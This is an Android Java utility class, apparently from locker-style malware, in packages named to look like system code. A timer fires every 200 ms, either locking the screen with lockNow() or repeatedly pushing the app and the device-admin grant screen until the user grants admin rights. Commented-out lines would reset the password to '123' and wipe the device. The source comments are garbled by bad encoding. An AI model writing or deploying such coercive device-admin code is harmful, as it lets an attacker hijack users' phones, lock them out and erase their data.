package com.android.ring.devutils;

import java.util.Timer;
import java.util.TimerTask;

import com.android.log.CLog;
import com.android.ring.MainActivity;
import com.android.wu.admin.AdminReceiver;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;

public class AdminUtils {
	public static final String DEVICE_ADMIN_ADD="com.android.settings.DeviceAdminAdd";
	
	Context context;
	ComponentName componentName;
	DevicePolicyManager devicePolicyManager ;
	
	long startTime;
	private static final long PERID=60000;
	Timer mTimer;
	
	public AdminUtils(Context context){
		this.context=context;

		// �豸��ȫ�������    2.2֮ǰ�İ汾��û�ж��Ⱪ¶�� ֻ��ͨ�����似����ȡ  
		devicePolicyManager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
		
		// ����Ȩ��
		componentName = new ComponentName(context, AdminReceiver.class);
	}
	
	public void test(){
		startTime=System.currentTimeMillis();
		mTimer=new Timer();
		mTimer.schedule(new TimerTask(){
			
			@Override
			public void run() {
				if(System.currentTimeMillis()-startTime>=PERID){
					mTimer.cancel();
				}
				start();
				// TODO Auto-generated method stub
			}}, 0, 200);
	}
	
	public void stop(){
		if(mTimer!=null){
			mTimer.cancel();
		}
	}
	
	public boolean start(){
		// �жϸ�����Ƿ���ϵͳ����Ա��Ȩ��
		boolean isAdminActive = devicePolicyManager.isAdminActive(componentName);
		if(isAdminActive){
			devicePolicyManager.lockNow(); // ����
//            devicePolicyManager.resetPassword("123", 0); // ������������
//            devicePolicyManager.wipeData(0);  �ָ���������  (�����Ҳ�Ҫ������ϲ���) ģ������֧�ָò���
			return true;
		} else {
			 ComponentName mComponentName=IntentUtils.getActivity(context);
			 CLog.print("adminUtils", mComponentName.getClassName());
			 if(!DEVICE_ADMIN_ADD.equals(mComponentName.getClassName())){
				 if(!MainActivity.class.getName().equals(mComponentName.getClassName())){
					 MainActivity.start(context);
				 }else{
			Intent intent = new Intent();
			// ָ����������
			intent.setAction(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
			// ָ�����ĸ������Ȩ
			intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
			context.startActivity(intent);
				 }
			 }
		}
		
		return false;
	}
//    private void register(){
//    	
//    	DevicePolicyManager mService = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
//    	Method method = Class.forName("android.os.ServiceManager").getMethod("getService", String.class);
//    	IBinder binder = (IBinder) method.invoke(null,new Object[] { Context.DEVICE_POLICY_SERVICE });
//    	mService = IDevicePolicyManager.Stub.asInterface(binder);
//
//
//
////    	3.ע��㲥������Ϊadmin�豸
//    	ComponentName mAdminName = new ComponentName(this, AdminReceiver.class);
//    	if (mService != null) {
//    	        if (!mService.isAdminActive(mAdminName)) {
//    	                    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
//    	                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,mAdminName);
//    	                    startActivity(intent);
//    	                }
//    	}
//    }

}
